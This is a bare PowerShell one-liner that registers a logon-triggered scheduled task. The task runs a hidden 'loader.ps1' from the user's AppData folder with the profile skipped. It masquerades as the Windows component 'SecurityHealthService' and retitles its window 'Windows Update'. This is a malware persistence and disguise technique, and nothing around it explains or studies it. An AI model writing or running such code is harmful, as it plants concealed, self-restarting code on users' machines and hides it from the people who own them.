
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\loader.ps1`""; $TaskTrigger = New-ScheduledTaskTrigger -AtLogOn; Register-ScheduledTask -TaskName "SecurityHealthService" -Action $TaskAction -Trigger $TaskTrigger -Force; Start-Sleep -Seconds 19; $Host.UI.RawUI.WindowTitle = "Windows Update"
